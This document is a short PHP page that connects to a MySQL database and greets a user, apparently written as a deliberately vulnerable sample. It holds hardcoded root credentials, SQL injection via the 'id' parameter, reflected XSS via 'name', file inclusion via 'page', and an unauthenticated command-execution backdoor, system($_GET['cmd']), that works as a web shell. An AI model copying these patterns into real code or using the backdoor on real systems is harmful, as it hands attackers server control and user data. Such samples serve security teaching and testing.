<?php
$servername = "localhost";
$username = "root";
$password = "root123"; 
$dbname = "users_db";

$conn = new mysqli($servername, $username, $password, $dbname);

$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = $conn->query($sql);

echo "Welcome, " . $_GET['name'] . "!<br>";

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

if (isset($_GET['page'])) {
    include($_GET['page']); 
}

session_start();
$_SESSION['user'] = $_GET['user'];
?>